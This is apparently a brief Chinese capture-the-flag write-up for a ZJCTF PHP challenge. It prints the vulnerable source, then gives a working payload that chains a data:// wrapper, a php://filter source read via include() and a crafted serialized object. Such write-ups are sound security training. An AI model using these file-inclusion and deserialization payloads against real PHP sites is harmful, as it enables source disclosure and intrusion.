感觉PHP还是学少了:sob:

先审计源码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

text利用data协议就可以，然后可以用include()函数读取源码（这一点没想到）php://filter/read=convert.base64-encode/resource=[*文件*名]，然后即再构造序列化对象即可

payload

```shell
http://30f04918-2bb4-43da-9e3d-5a3313311db9.node4.buuoj.cn:81/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```

